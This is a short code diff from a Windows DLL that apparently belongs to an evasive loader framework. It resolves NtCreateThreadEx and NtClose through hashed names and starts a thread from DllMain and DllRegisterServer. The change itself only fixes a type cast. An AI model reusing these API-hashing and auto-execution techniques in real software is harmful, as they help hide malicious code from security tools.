@@ -305,7 +305,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 			if (!_NtCl && _hnt_d) _NtCl = (typeNtClose)erebus::GetProcAddressC(_hnt_d, H("NtClose"));
 			HANDLE hThread = NULL;
 			if (_NtCTE) _NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(),
-			                   (PVOID)EntryThread, NULL, 0, 0, 0, 0, NULL);
+			                   (PUSER_THREAD_START_ROUTINE)EntryThread, NULL, 0, 0, 0, 0, NULL);
 			if (hThread && _NtCl) _NtCl(hThread);
 		}
 		break;
@@ -328,7 +328,7 @@ extern "C" __declspec(dllexport) HRESULT DllRegisterServer(void)
 		if (!_NtCl && _hnt_r) _NtCl = (typeNtClose)erebus::GetProcAddressC(_hnt_r, H("NtClose"));
 		HANDLE hThread = NULL;
 		if (_NtCTE) _NtCTE(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(),
-		                   (PVOID)EntryThread, NULL, 0, 0, 0, 0, NULL);
+		                   (PUSER_THREAD_START_ROUTINE)EntryThread, NULL, 0, 0, 0, 0, NULL);
 		if (hThread && _NtCl) _NtCl(hThread);
 	}
 	return S_OK;
